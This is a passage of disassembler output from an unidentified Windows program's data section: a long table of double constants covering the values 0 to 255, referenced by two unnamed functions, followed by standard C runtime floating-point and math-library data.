dbl_424470	dq 212.0		; DATA XREF: sub_402C40+2972r
					; sub_402C40+2C7Er ...
dbl_424478	dq 122.0		; DATA XREF: sub_402C40+2642r
					; sub_402C40+2D26r ...
dbl_424480	dq 140.0		; DATA XREF: sub_402C40+255Er
					; sub_402C40+326Er ...
dbl_424488	dq 215.0		; DATA XREF: sub_402C40+249Er
					; sub_409DF0+1830r ...
dbl_424490	dq 241.0		; DATA XREF: sub_402C40+2456r
					; sub_409DF0+15E4r ...
dbl_424498	dq 196.0		; DATA XREF: sub_402C40+21DEr
					; sub_402C40+26DEr ...
dbl_4244A0	dq 103.0		; DATA XREF: sub_402C40+2196r
					; sub_402C40+21AEr ...
dbl_4244A8	dq 235.0		; DATA XREF: sub_402C40+212Er
					; sub_402C40+2C8Ar ...
dbl_4244B0	dq 0.0			; DATA XREF: __handle_exc+145r
dbl_4244B8	dq 106.0		; DATA XREF: sub_402C40+2012r
					; sub_402C40+2202r ...
dbl_4244C0	dq 198.0		; DATA XREF: sub_402C40+1FB2r
					; sub_402C40+23FAr ...
dbl_4244C8	dq 68.0			; DATA XREF: sub_402C40+1FA6r
					; sub_402C40+262Ar ...
dbl_4244D0	dq 194.0		; DATA XREF: sub_402C40+1F6Ar
					; sub_402C40+27F2r ...
dbl_4244D8	dq 182.0		; DATA XREF: sub_402C40+1EFEr
					; sub_402C40+1F16r ...
dbl_4244E0	dq 51.0			; DATA XREF: sub_402C40+1E62r
					; sub_402C40+210Ar ...
dbl_4244E8	dq 205.0		; DATA XREF: sub_402C40+1DD2r
					; sub_402C40+35FEr ...
dbl_4244F0	dq 232.0		; DATA XREF: sub_402C40+1DC6r
					; sub_402C40+283Ar ...
dbl_4244F8	dq 178.0		; DATA XREF: sub_402C40+1D72r
					; sub_402C40+2AB6r ...
dbl_424500	dq 118.0		; DATA XREF: sub_402C40+1D66r
					; sub_402C40+20FEr ...
dbl_424508	dq 211.0		; DATA XREF: sub_402C40+1D4Er
					; sub_402C40+2F96r ...
dbl_424510	dq 40.0			; DATA XREF: sub_402C40+1D22r
					; sub_409DF0+1D10r ...
dbl_424518	dq 71.0			; DATA XREF: sub_402C40+1B52r
					; sub_402C40+24AAr ...
dbl_424520	dq 85.0			; DATA XREF: sub_402C40+1AE6r
					; sub_402C40+25D6r ...
dbl_424528	dq 33.0			; DATA XREF: sub_402C40+1A9Er
					; sub_402C40+2B0Ar ...
dbl_424530	dq 240.0		; DATA XREF: sub_402C40+1A86r
					; sub_409DF0+1F04r ...
dbl_424538	dq 25.0			; DATA XREF: sub_402C40+1A32r
					; sub_402C40+264Er ...
dbl_424540	dq 172.0		; DATA XREF: sub_402C40+19C6r
					; sub_402C40+2316r ...
dbl_424548	dq 46.0			; DATA XREF: sub_402C40+19AEr
					; sub_402C40+2262r ...
dbl_424550	dq 78.0			; DATA XREF: sub_402C40+1972r
					; sub_402C40+244Ar ...
dbl_424558	dq 161.0		; DATA XREF: sub_402C40+1966r
					; sub_402C40+1C12r ...
dbl_424560	dq 90.0			; DATA XREF: sub_402C40+18D6r
					; sub_402C40+247Ar ...
dbl_424568	dq 56.0			; DATA XREF: sub_402C40+1876r
					; sub_402C40+20CEr ...
dbl_424570	dq 207.0		; DATA XREF: sub_402C40+1816r
					; sub_402C40+1C5Ar ...
dbl_424578	dq 66.0			; DATA XREF: sub_402C40+17E6r
					; sub_402C40+1FD6r ...
dbl_424580	dq 3.0			; DATA XREF: sub_402C40+17AAr
					; sub_402C40+1A62r ...
dbl_424588	dq 177.0		; DATA XREF: sub_402C40+179Er
					; sub_402C40+3FEAr ...
dbl_424590	dq 26.0			; DATA XREF: sub_402C40+177Ar
					; sub_402C40+1A3Er ...
dbl_424598	dq 37.0			; DATA XREF: sub_402C40+170Er
					; sub_402C40+18E2r ...
dbl_4245A0	dq 126.0		; DATA XREF: sub_402C40+16BAr
					; sub_402C40+2516r ...
dbl_4245A8	dq 89.0			; DATA XREF: sub_402C40+16A2r
					; sub_402C40+2042r ...
dbl_4245B0	dq 2.0			; DATA XREF: sub_402C40+1696r
					; sub_402C40+1E1Ar ...
dbl_4245B8	dq 208.0		; DATA XREF: sub_402C40+1642r
					; sub_409DF0+1BE4r ...
dbl_4245C0	dq 86.0			; DATA XREF: sub_402C40+15CAr
					; sub_402C40+3676r ...
dbl_4245C8	dq 34.0			; DATA XREF: sub_402C40+1582r
					; sub_402C40+19DEr ...
dbl_4245D0	dq 120.0		; DATA XREF: sub_402C40+153Ar
					; sub_402C40+256Ar ...
dbl_4245D8	dq 144.0		; DATA XREF: sub_402C40+1522r
					; sub_402C40+28E2r ...
dbl_4245E0	dq 216.0		; DATA XREF: sub_402C40+1516r
					; sub_402C40+250Ar ...
dbl_4245E8	dq 94.0			; DATA XREF: sub_402C40+150Ar
					; sub_402C40+17DAr ...
dbl_4245F0	dq 242.0		; DATA XREF: sub_402C40+141Ar
					; sub_402C40+20B6r ...
dbl_4245F8	dq 128.0		; DATA XREF: sub_402C40+140Er
					; sub_402C40+2432r ...
dbl_424600	dq 28.0			; DATA XREF: sub_402C40+13F6r
					; sub_402C40+1A02r ...
dbl_424608	dq 79.0			; DATA XREF: sub_402C40+13C6r
					; sub_402C40+2172r ...
dbl_424610	dq 189.0		; DATA XREF: sub_402C40+13BAr
					; sub_402C40+2A4Ar ...
dbl_424618	dq 152.0		; DATA XREF: sub_402C40+1396r
					; sub_402C40+14DAr ...
dbl_424620	dq 200.0		; DATA XREF: sub_402C40+137Er
					; sub_402C40+1C9Er ...
dbl_424628	dq 41.0			; DATA XREF: sub_402C40+134Er
					; sub_402C40+34BAr ...
dbl_424630	dq 58.0			; DATA XREF: sub_402C40+1306r
					; sub_402C40+1366r ...
dbl_424638	dq 93.0			; DATA XREF: sub_402C40+12EEr
					; sub_402C40+1882r ...
dbl_424640	dq 116.0		; DATA XREF: sub_402C40+12D6r
					; sub_402C40+39A2r ...
dbl_424648	dq 36.0			; DATA XREF: sub_402C40+12BEr
					; sub_402C40+15D6r ...
dbl_424650	dq 234.0		; DATA XREF: sub_402C40+12A6r
					; sub_402C40+1BCAr ...
dbl_424658	dq 230.0		; DATA XREF: sub_402C40+1282r
					; sub_402C40+2AFEr ...
dbl_424660	dq 195.0		; DATA XREF: sub_402C40+1276r
					; sub_402C40+3772r ...
dbl_424668	dq 52.0			; DATA XREF: sub_402C40+126Ar
					; sub_402C40+13AEr ...
dbl_424670	dq 155.0		; DATA XREF: sub_402C40+125Er
					; sub_402C40+1ECEr ...
dbl_424678	dq 159.0		; DATA XREF: sub_402C40+11FEr
					; sub_402C40+16AEr ...
dbl_424680	dq 157.0		; DATA XREF: sub_402C40+11F2r
					; sub_402C40+16EAr ...
dbl_424688	dq 202.0		; DATA XREF: sub_402C40+11CEr
					; sub_402C40+171Ar ...
dbl_424690	dq 136.0		; DATA XREF: sub_402C40+11C2r
					; sub_402C40+1CAAr ...
dbl_424698	dq 137.0		; DATA XREF: sub_402C40+11B6r
					; sub_402C40+317Er ...
dbl_4246A0	dq 218.0		; DATA XREF: sub_402C40+11AAr
					; sub_402C40+307Ar ...
dbl_4246A8	dq 105.0		; DATA XREF: sub_402C40+1162r
					; sub_402C40+18BEr ...
dbl_4246B0	dq 181.0		; DATA XREF: sub_402C40+1156r
					; sub_402C40+3A6Er ...
dbl_4246B8	dq 229.0		; DATA XREF: sub_402C40+1132r
					; sub_402C40+2EEEr ...
dbl_4246C0	dq 143.0		; DATA XREF: sub_402C40+110Er
					; sub_402C40+3382r ...
dbl_4246C8	dq 1.0			; DATA XREF: sub_409DF0+1318r
dbl_4246D0	dq 54.0			; DATA XREF: sub_402C40+109Ar
					; sub_402C40+1B9Ar ...
dbl_4246D8	dq 199.0		; DATA XREF: sub_402C40+1076r
					; sub_402C40+20E6r ...
dbl_4246E0	dq 65.0			; DATA XREF: sub_402C40+1046r
					; sub_402C40+3A86r ...
dbl_4246E8	dq 187.0		; DATA XREF: sub_402C40+FFEr
					; sub_402C40+17FEr ...
dbl_4246F0	dq 151.0		; DATA XREF: sub_402C40+FCEr
					; sub_402C40+168Ar ...
dbl_4246F8	dq 115.0		; DATA XREF: sub_402C40+F9Er
					; sub_402C40+1552r ...
dbl_424700	dq 107.0		; DATA XREF: sub_402C40+F7Ar
					; sub_402C40+208Ar ...
dbl_424708	dq 154.0		; DATA XREF: sub_402C40+F62r
					; sub_402C40+207Er ...
dbl_424710	dq 201.0		; DATA XREF: sub_402C40+F56r
					; sub_402C40+FF2r ...
dbl_424718	dq 72.0			; DATA XREF: sub_402C40+F4Ar
					; sub_402C40+289Ar ...
dbl_424720	dq 142.0		; DATA XREF: sub_402C40+F1Ar
					; sub_402C40+14CEr ...
dbl_424728	dq 16.0			; DATA XREF: sub_402C40+EF6r
					; sub_402C40+1762r ...
dbl_424730	dq 244.0		; DATA XREF: sub_402C40+EEAr
					; sub_402C40+11DAr ...
dbl_424738	dq 236.0		; DATA XREF: sub_402C40+EDEr
					; sub_402C40+1456r ...
dbl_424740	dq 224.0		; DATA XREF: sub_402C40+ED2r
					; sub_402C40+F6Er ...
dbl_424748	dq 4.0			; DATA XREF: sub_402C40+EAEr
					; sub_402C40+1402r ...
dbl_424750	dq 247.0		; DATA XREF: sub_402C40+EA2r
					; sub_402C40+129Ar ...
dbl_424758	dq 108.0		; DATA XREF: sub_402C40+E8Ar
					; sub_402C40+3112r ...
dbl_424760	dq 62.0			; DATA XREF: sub_402C40+E5Ar
					; sub_402C40+17CEr ...
dbl_424768	dq 203.0		; DATA XREF: sub_402C40+E4Er
					; sub_402C40+14E6r ...
dbl_424770	dq 253.0		; DATA XREF: sub_402C40+E36r
					; sub_402C40+1FEEr ...
dbl_424778	dq 239.0		; DATA XREF: sub_402C40+E2Ar
					; sub_402C40+185Er ...
dbl_424780	dq 80.0			; DATA XREF: sub_402C40+E12r
					; sub_402C40+2382r ...
dbl_424788	dq 165.0		; DATA XREF: sub_402C40+DFAr
					; sub_402C40+3E46r ...
dbl_424790	dq 171.0		; DATA XREF: sub_402C40+DEEr
					; sub_402C40+1492r ...
dbl_424798	dq 112.0		; DATA XREF: sub_402C40+DBEr
					; sub_402C40+1C06r ...
dbl_4247A0	dq 204.0		; DATA XREF: sub_402C40+DA6r
					; sub_402C40+116Er ...
dbl_4247A8	dq 101.0		; DATA XREF: sub_402C40+D9Ar
					; sub_402C40+138Ar ...
dbl_4247B0	dq 42.0			; DATA XREF: sub_402C40+D76r
					; sub_402C40+1D3Ar ...
dbl_4247B8	dq 32.0			; DATA XREF: sub_402C40+D52r
					; sub_402C40+E42r ...
dbl_4247C0	dq 10.0			; DATA XREF: sub_402C40+D0Ar
					; sub_402C40+F32r ...
dbl_4247C8	dq 219.0		; DATA XREF: sub_402C40+CF2r
					; sub_402C40+348Ar ...
dbl_4247D0	dq 43.0			; DATA XREF: sub_402C40+CAAr
					; sub_409DF0+1584r ...
dbl_4247D8	dq 246.0		; DATA XREF: sub_402C40+C9Er
					; sub_402C40+1022r ...
dbl_4247E0	dq 255.0		; DATA XREF: sub_402C40+C62r
					; sub_402C40+2492r ...
dbl_4247E8	dq 20.0			; DATA XREF: sub_402C40+C56r
					; sub_402C40+229Er ...
dbl_4247F0	dq 61.0			; DATA XREF: sub_402C40+C4Ar
					; sub_402C40+C86r ...
dbl_4247F8	dq 74.0			; DATA XREF: sub_402C40+C26r
					; sub_402C40+F86r ...
dbl_424800	dq 73.0			; DATA XREF: sub_402C40+C1Ar
					; sub_402C40+1EAAr ...
dbl_424808	dq 169.0		; DATA XREF: sub_402C40+C0Er
					; sub_402C40+132Ar ...
dbl_424810	dq 175.0		; DATA XREF: sub_402C40+C02r
					; sub_402C40+C92r ...
dbl_424818	dq 53.0			; DATA XREF: sub_402C40+BDEr
					; sub_402C40+1BEEr ...
dbl_424820	dq 254.0		; DATA XREF: sub_402C40+B96r
					; sub_402C40+FE6r ...
dbl_424828	dq 48.0			; DATA XREF: sub_402C40+B8Ar
					; sub_402C40+123Ar ...
dbl_424830	dq 113.0		; DATA XREF: sub_402C40+B5Ar
					; sub_402C40+E06r ...
dbl_424838	dq 245.0		; DATA XREF: sub_402C40+B4Er
					; sub_402C40+2756r ...
dbl_424840	dq 110.0		; DATA XREF: sub_402C40+B36r
					; sub_402C40+100Ar ...
dbl_424848	dq 45.0			; DATA XREF: sub_402C40+B2Ar
					; sub_402C40+1A92r ...
dbl_424850	dq 167.0		; DATA XREF: sub_402C40+B12r
					; sub_402C40+CB6r ...
dbl_424858	dq 69.0			; DATA XREF: sub_402C40+AEEr
					; sub_402C40+1672r ...
dbl_424860	dq 9.0			; DATA XREF: sub_402C40+AE2r
					; sub_402C40+20C2r ...
dbl_424868	dq 124.0		; DATA XREF: sub_402C40+ACAr
					; sub_402C40+1576r ...
dbl_424870	dq 82.0			; DATA XREF: sub_402C40+ABEr
					; sub_402C40+2B46r ...
dbl_424878	dq 27.0			; DATA XREF: sub_402C40+AB2r
					; sub_402C40+F92r ...
dbl_424880	dq 160.0		; DATA XREF: sub_402C40+A8Er
					; sub_402C40+1372r ...
dbl_424888	dq 227.0		; DATA XREF: sub_402C40+A82r
					; sub_402C40+C7Ar ...
dbl_424890	dq 213.0		; DATA XREF: sub_402C40+A76r
					; sub_402C40+D5Er ...
dbl_424898	dq 228.0		; DATA XREF: sub_402C40+A6Ar
					; sub_402C40+DCAr ...
dbl_4248A0	dq 67.0			; DATA XREF: sub_402C40+A46r
					; sub_402C40+1216r ...
dbl_4248A8	dq 6.0			; DATA XREF: sub_402C40+A3Ar
					; sub_402C40+21C6r ...
dbl_4248B0	dq 134.0		; DATA XREF: sub_402C40+A22r
					; sub_402C40+F02r ...
dbl_4248B8	dq 130.0		; DATA XREF: sub_402C40+A16r
					; sub_402C40+C32r ...
dbl_4248C0	dq 231.0		; DATA XREF: sub_402C40+A0Ar
					; sub_402C40+FC2r ...
dbl_4248C8	dq 13.0			; DATA XREF: sub_402C40+9E6r
					; sub_402C40+1BBEr ...
dbl_4248D0	dq 193.0		; DATA XREF: sub_402C40+9DAr
					; sub_402C40+BF6r ...
dbl_4248D8	dq 179.0		; DATA XREF: sub_402C40+9C2r
					; sub_402C40+BA2r ...
dbl_4248E0	dq 87.0			; DATA XREF: sub_402C40+99Er
					; sub_402C40+BBAr ...
dbl_4248E8	dq 109.0		; DATA XREF: sub_402C40+986r
					; sub_402C40+AA6r ...
dbl_4248F0	dq 35.0			; DATA XREF: sub_402C40+97Ar
					; sub_402C40+B72r ...
dbl_4248F8	dq 188.0		; DATA XREF: sub_402C40+962r
					; sub_402C40+1222r ...
dbl_424900	dq 12.0			; DATA XREF: sub_402C40+956r
					; sub_402C40+14F2r ...
dbl_424908	dq 24.0			; DATA XREF: sub_402C40+926r
					; sub_402C40+1C6Er ...
dbl_424910	dq 81.0			; DATA XREF: sub_402C40+90Er
					; sub_402C40+9CEr ...
dbl_424918	dq 206.0		; DATA XREF: sub_402C40+902r
					; sub_402C40+1726r ...
dbl_424920	dq 129.0		; DATA XREF: sub_402C40+8F6r
					; sub_402C40+147Ar ...
dbl_424928	dq 99.0			; DATA XREF: sub_402C40+8D2r
					; sub_402C40+D2Er ...
dbl_424930	dq 23.0			; DATA XREF: sub_402C40+8C6r
					; sub_402C40+1082r ...
dbl_424938	dq 214.0		; DATA XREF: sub_402C40+8BAr
					; sub_402C40+F26r ...
dbl_424940	dq 133.0		; DATA XREF: sub_402C40+896r
					; sub_402C40+D6Ar ...
dbl_424948	dq 183.0		; DATA XREF: sub_402C40+88Ar
					; sub_402C40+E72r ...
dbl_424950	dq 138.0		; DATA XREF: sub_402C40+87Er
					; sub_402C40+9F2r ...
dbl_424958	dq 146.0		; DATA XREF: sub_402C40+872r
					; sub_402C40+11E6r ...
dbl_424960	dq 39.0			; DATA XREF: sub_402C40+866r
					; sub_402C40+BD2r ...
dbl_424968	dq 104.0		; DATA XREF: sub_402C40+85Ar
					; sub_402C40+D3Ar ...
dbl_424970	dq 125.0		; DATA XREF: sub_402C40+842r
					; sub_402C40+14AAr ...
dbl_424978	dq 176.0		; DATA XREF: sub_402C40+836r
					; sub_402C40+F3Er ...
dbl_424980	dq 92.0			; DATA XREF: sub_402C40+82Ar
					; sub_402C40+94Ar ...
dbl_424988	dq 102.0		; DATA XREF: sub_402C40+812r
					; sub_402C40+10EEr ...
dbl_424990	dq 7.0			; DATA XREF: sub_402C40+806r
					; sub_402C40+143Er ...
dbl_424998	dq 173.0		; DATA XREF: sub_402C40+7E2r
					; sub_402C40+7FAr ...
dbl_4249A0	dq 221.0		; DATA XREF: sub_402C40+7B2r
					; sub_402C40+19D2r ...
dbl_4249A8	dq 180.0		; DATA XREF: sub_402C40+79Ar
					; sub_402C40+17B6r ...
dbl_4249B0	dq 217.0		; DATA XREF: sub_402C40+78Er
					; sub_402C40+9FEr ...
dbl_4249B8	dq 83.0			; DATA XREF: sub_402C40+776r
					; sub_402C40+B66r ...
dbl_4249C0	dq 88.0			; DATA XREF: sub_402C40+76Ar
					; sub_402C40+D82r ...
dbl_4249C8	dq 210.0		; DATA XREF: sub_402C40+75Er
					; sub_402C40+182Er ...
dbl_4249D0	dq 91.0			; DATA XREF: sub_402C40+73Ar
					; sub_402C40+1792r ...
dbl_4249D8	dq 145.0		; DATA XREF: sub_402C40+722r
					; sub_402C40+161Er ...
dbl_4249E0	dq 139.0		; DATA XREF: sub_402C40+70Ar
					; sub_402C40+782r ...
dbl_4249E8	dq 237.0		; DATA XREF: sub_402C40+6FEr
					; sub_402C40+105Er ...
dbl_4249F0	dq 209.0		; DATA XREF: sub_402C40+6DAr
					; sub_402C40+7A6r ...
dbl_4249F8	dq 30.0			; DATA XREF: sub_402C40+6CEr
					; sub_402C40+306Er ...
dbl_424A00	dq 148.0		; DATA XREF: sub_402C40+6C2r
					; sub_402C40+15EEr ...
dbl_424A08	dq 60.0			; DATA XREF: sub_402C40+6AAr
					; sub_402C40+72Er ...
dbl_424A10	dq 29.0			; DATA XREF: sub_402C40+69Er
					; sub_402C40+91Ar ...
dbl_424A18	dq 166.0		; DATA XREF: sub_402C40+692r
					; sub_402C40+9AAr ...
dbl_424A20	dq 97.0			; DATA XREF: sub_402C40+686r
					; sub_402C40+A9Ar ...
dbl_424A28	dq 222.0		; DATA XREF: sub_402C40+66Er
					; sub_402C40+26EAr ...
dbl_424A30	dq 164.0		; DATA XREF: sub_402C40+662r
					; sub_402C40+7EEr ...
dbl_424A38	dq 141.0		; DATA XREF: sub_402C40+656r
					; sub_402C40+13DEr ...
dbl_424A40	dq 150.0		; DATA XREF: sub_402C40+63Er
					; sub_402C40+D8Er ...
dbl_424A48	dq 226.0		; DATA XREF: sub_402C40+626r
					; sub_402C40+8AEr ...
dbl_424A50	dq 44.0			; DATA XREF: sub_402C40+61Ar
					; sub_402C40+67Ar ...
dbl_424A58	dq 131.0		; DATA XREF: sub_402C40+60Er
					; sub_402C40+B06r ...
dbl_424A60	dq 63.0			; DATA XREF: sub_402C40+602r
					; sub_402C40+8A2r ...
dbl_424A68	dq 184.0		; DATA XREF: sub_402C40+5F6r
					; sub_402C40+AD6r ...
dbl_424A70	dq 225.0		; DATA XREF: sub_402C40+5DEr
					; sub_402C40+9B6r ...
dbl_424A78	dq 47.0			; DATA XREF: sub_402C40+5D2r
					; sub_402C40+1ACEr ...
dbl_424A80	dq 170.0		; DATA XREF: sub_402C40+5C6r
					; sub_402C40+7D6r ...
dbl_424A88	dq 18.0			; DATA XREF: sub_402C40+5BAr
					; sub_402C40+1052r ...
dbl_424A90	dq 132.0		; DATA XREF: sub_402C40+5AEr
					; sub_402C40+165Ar ...
dbl_424A98	dq 252.0		; DATA XREF: sub_402C40+5A2r
					; sub_402C40+632r ...
dbl_424AA0	dq 156.0		; DATA XREF: sub_402C40+596r
					; sub_402C40+19EAr ...
dbl_424AA8	dq 22.0			; DATA XREF: sub_402C40+58Ar
					; sub_402C40+1126r ...
dbl_424AB0	dq 223.0		; DATA XREF: sub_402C40+57Er
					; sub_402C40+2822r ...
dbl_424AB8	dq 70.0			; DATA XREF: sub_402C40+572r
					; sub_402C40+223Er ...
dbl_424AC0	dq 111.0		; DATA XREF: sub_402C40+566r
					; sub_402C40+1B5Er ...
dbl_424AC8	dq 57.0			; DATA XREF: sub_402C40+54Er
					; sub_402C40+21A2r ...
dbl_424AD0	dq 121.0		; DATA XREF: sub_402C40+542r
					; sub_402C40+6F2r ...
dbl_424AD8	dq 149.0		; DATA XREF: sub_402C40+536r
					; sub_402C40+55Ar ...
dbl_424AE0	dq 233.0		; DATA XREF: sub_402C40+52Ar
					; sub_402C40+A2Er ...
dbl_424AE8	dq 127.0		; DATA XREF: sub_402C40+51Er
					; sub_402C40+1942r ...
dbl_424AF0	dq 168.0		; DATA XREF: sub_402C40+512r
					; sub_402C40+106Ar ...
dbl_424AF8	dq 76.0			; DATA XREF: sub_402C40+506r
					; sub_402C40+716r ...
dbl_424B00	dq 147.0		; DATA XREF: sub_402C40+4FAr
					; sub_402C40+932r ...
dbl_424B08	dq 100.0		; DATA XREF: sub_402C40+4EEr
					; sub_402C40+162Ar ...
dbl_424B10	dq 17.0			; DATA XREF: sub_402C40+4E2r
					; sub_402C40+FDAr ...
dbl_424B18	dq 119.0		; DATA XREF: sub_402C40+4CAr
					; sub_402C40+8DEr ...
dbl_424B20	dq 192.0		; DATA XREF: sub_402C40+4BEr
					; sub_402C40+1312r ...
dbl_424B28	dq 174.0		; DATA XREF: sub_402C40+4A6r
					; sub_402C40+F0Er ...
dbl_424B30	dq 64.0			; DATA XREF: sub_402C40+49Ar
					; sub_402C40+1B76r ...
dbl_424B38	dq 14.0			; DATA XREF: sub_402C40+48Er
					; sub_402C40+EC6r ...
dbl_424B40	dq 158.0		; DATA XREF: sub_402C40+482r
					; sub_402C40+4B2r ...
dbl_424B48	dq 84.0			; DATA XREF: sub_402C40+476r
					; sub_409DF0+1F88r ...
dbl_424B50	dq 190.0		; DATA XREF: sub_402C40+46Ar
					; sub_402C40+1906r ...
dbl_424B58	dq 31.0			; DATA XREF: sub_402C40+45Er
					; sub_402C40+CDAr ...
dbl_424B60	dq 186.0		; DATA XREF: sub_402C40+452r
					; sub_402C40+AFAr ...
dbl_424B68	dq 197.0		; DATA XREF: sub_402C40+446r
					; sub_402C40+64Ar ...
dbl_424B70	dq 59.0			; DATA XREF: sub_402C40+43Ar
					; sub_402C40+10E2r ...
dbl_424B78	dq 185.0		; DATA XREF: sub_402C40+422r
					; sub_402C40+220Er ...
dbl_424B80	dq 77.0			; DATA XREF: sub_402C40+416r
					; sub_402C40+8EAr ...
dbl_424B88	dq 135.0		; DATA XREF: sub_402C40+40Ar
					; sub_402C40+746r ...
dbl_424B90	dq 50.0			; DATA XREF: sub_402C40+3FEr
					; sub_402C40+B42r ...
dbl_424B98	dq 75.0			; DATA XREF: sub_402C40+3F2r
					; sub_402C40+BEAr ...
dbl_424BA0	dq 123.0		; DATA XREF: sub_402C40+3E6r
					; sub_402C40+7BEr ...
dbl_424BA8	dq 5.0			; DATA XREF: sub_402C40+3CEr
					; sub_402C40+A52r ...
dbl_424BB0	dq 251.0		; DATA XREF: sub_402C40+3C2r
					; sub_402C40+42Er ...
dbl_424BB8	dq 15.0			; DATA XREF: sub_402C40+3B6r
					; sub_402C40+84Er ...
dbl_424BC0	dq 114.0		; DATA XREF: sub_402C40+3AAr
					; sub_402C40+7CAr ...
dbl_424BC8	dq 8.0			; DATA XREF: sub_402C40+39Er
					; sub_402C40+81Er ...
dbl_424BD0	dq 38.0			; DATA XREF: sub_402C40+392r
					; sub_402C40+15BEr ...
dbl_424BD8	dq 220.0		; DATA XREF: sub_402C40+386r
					; sub_402C40+3DAr ...
dbl_424BE0	dq 163.0		; DATA XREF: sub_402C40+37Ar
					; sub_402C40+5EAr ...
dbl_424BE8	dq 191.0		; DATA XREF: sub_402C40+36Er
					; sub_402C40+202Ar ...
dbl_424BF0	dq 49.0			; DATA XREF: sub_402C40+362r
					; sub_402C40+B7Er ...
dbl_424BF8	dq 98.0			; DATA XREF: sub_402C40+356r
					; sub_402C40+1B8Er ...
dbl_424C00	dq 21.0			; DATA XREF: sub_402C40+34Ar
					; sub_402C40+992r ...
dbl_424C08	dq 162.0		; DATA XREF: sub_402C40+33Er
					; sub_402C40+96Er ...
dbl_424C10	dq 153.0		; DATA XREF: sub_402C40+332r
					; sub_402C40+4D6r ...
dbl_424C18	dq 55.0			; DATA XREF: sub_409DF0+3368r
					; WinMain(x,x,x,x)+1BCBr ...
dbl_424C20	dq 11.0			; DATA XREF: sub_409DF0+2DB0r
					; sub_409DF0+32C0r ...
dbl_424C28	dq 95.0			; DATA XREF: sub_409DF0+1B3Cr
					; sub_409DF0+1B6Cr ...
off_424C30	dd offset __fpmath	; DATA XREF: __cinit+5r __cinit+Eo ...
		dd offset nullsub_1
		dd offset nullsub_1
; char Src[]
Src		db 'e+000',0            ; DATA XREF: __cftoe2_l:loc_416A4Fo
		align 8
dbl_424C48	dq 4195835.0		; DATA XREF: __ms_p5_test_fdiv+11r
dbl_424C50	dq 3145727.0		; DATA XREF: __ms_p5_test_fdiv+8r
; CHAR ProcName[]
ProcName	db 'IsProcessorFeaturePresent',0 ; DATA XREF: __ms_p5_mp_test_fdiv+Fo
		align 4
; CHAR ModuleName[]
ModuleName	db 'KERNEL32',0         ; DATA XREF: __ms_p5_mp_test_fdivo
		align 10h
		dd 0
		dd 80000000h, 0
		dd 80000000h
xmmword_424C90	xmmword	0FFF0000000000000FFF0000000000000h ; DATA XREF:	start_1+124r
xmmword_424CA0	xmmword	0FFFFFFC000000000FFFFFFC0h ; DATA XREF:	start_1+ADr
xmmword_424CB0	xmmword	0FFC0000000000000FFC0h ; DATA XREF: start_1+B9r
xmmword_424CC0	xmmword	43380000000000004338000000000000h ; DATA XREF: start_1+Cr
		dd 0
		dd 3C300000h, 0
		dd 3C300000h
xmmword_424CE0	xmmword	40571547652B82FE40571547652B82FEh ; DATA XREF: start_1+4r
xmmword_424CF0	xmmword	3F862E42FEFA00003F862E42FEFA0000h ; DATA XREF: start_1+14r
xmmword_424D00	xmmword	3D1CF79ABC9E3B3A3D1CF79ABC9E3B3Ah ; DATA XREF: start_1+1Cr
xmmword_424D10	xmmword	3FC555555566A45A3F811074B1D108E5h ; DATA XREF: start_1+5Cr
xmmword_424D20	xmmword	3FDFFFFFFFFFE17B3FA5555726ECED80h ; DATA XREF: start_1+68r
		align 20h
		dd 0E03754Dh, 3CAD7BBFh, 3E778060h, 2C9Ah, 3567F613h, 3C8CD252h
		dd 0D3158574h, 59B0h, 61E6C861h, 3C60F74Eh, 18759BC8h
		dd 8745h, 5D837B6Ch, 3C979AA6h,	6CF9890Fh, 0B558h, 702F9CD1h
		dd 3C3EBE3Dh, 32D3D1A2h, 0E3ECh, 1E63BCD8h, 3CA3516Eh
		dd 0D0125B50h, 11301h, 26F0387Bh, 3CA4C554h, 0AEA92DDFh
		dd 1429Ah, 62523FB6h, 3CA95153h, 3C7D517Ah, 172B8h, 3F1353BFh
		dd 3C8B898Ch, 0EB6FCB75h, 1A35Bh, 3E3A2F5Fh, 3C9AECF7h
		dd 3168B9AAh, 1D487h, 44A6C38Dh, 3C8A6F41h, 88628CD6h
		dd 2063Bh, 0E3A8A894h, 3C968EFDh, 6E756238h, 2387Ah, 981FE7F2h
		dd 3C80472Bh, 65E27CDDh, 26B45h, 6D09AB31h, 3C82F7E1h
		dd 0F51FDEE1h, 29E9Dh, 720C0AB3h, 3C8B3782h, 0A6E4030Bh
		dd 2D285h, 4DB0ABB6h, 3C834D75h, 0A31B715h, 306FEh, 5DD3F84Ah
		dd 3C8FDD39h, 0B26416FFh, 33C08h, 0CC187D29h, 3CA12F8Ch
		dd 373AA9CAh, 371A7h, 738B5E8Bh, 3CA7D229h, 34E59FF6h
		dd 3A7DBh, 0A72A4C6Dh, 3C859F48h, 4C123422h, 3DEA6h, 259D9205h
		dd 3CA8B846h, 21F72E29h, 4160Ah, 60C2AC12h, 3C4363EDh
		dd 6061892Dh, 44E08h, 0DAA10379h, 3C6ECCE1h, 0B5C13CD0h
		dd 486A2h, 0BB7AAFB0h, 3C7690CEh, 0D5362A27h, 4BFDAh, 9B282A09h
		dd 3CA083CCh, 769D2CA6h, 4F9B2h, 0C1AAE707h, 3CA509B0h
		dd 569D4F81h, 5342Bh, 18FDD78Eh, 3C933505h, 36B527DAh
		dd 56F47h, 0E21C5409h, 3C9063E1h, 0DD485429h, 5AB07h, 2B64C035h
		dd 3C9432E6h, 15AD2148h, 5E76Fh, 99F08C0Ah, 3CA01284h
		dd 0B03A5584h, 6247Eh, 73DC06h,	3C99F087h, 82552224h, 66238h
		dd 0DA05571h, 3C998D4Dh, 667F3BCCh, 6A09Eh, 86CE4786h
		dd 3CA52BB9h, 3C651A2Eh, 6DFB2h, 206F0DABh, 3CA32092h
		dd 0E8EC5F73h, 71F75h, 8E17A7A6h, 3CA06122h, 564267C8h
		dd 75FEBh, 461E9F86h, 3CA244ACh, 73EB0186h, 7A114h, 0ABD66C55h
		dd 3C65EBE1h, 36CF4E62h, 7E2F3h, 0BBFF67D0h, 3C96FE9Fh
		dd 994CCE12h, 82589h, 14C801DFh, 3C951F14h, 9B4492ECh
		dd 868D9h, 0C1F0EAB4h, 3C8DB72Fh, 422AA0DBh, 8ACE5h, 59F35F44h
		dd 3C7BF683h, 99157736h, 8F1AEh, 9C06283Ch, 3CA360BAh
		dd 0B0CDC5E4h, 93737h, 20F962AAh, 3C95E8D1h, 9FDE4E4Fh
		dd 97D82h, 2B91CE27h, 3C71AFFCh, 82A3F090h, 9C491h, 589A2EBDh
		dd 3C9B6D34h, 7B5DE564h, 0A0C66h, 9AB89880h, 3C95277Ch
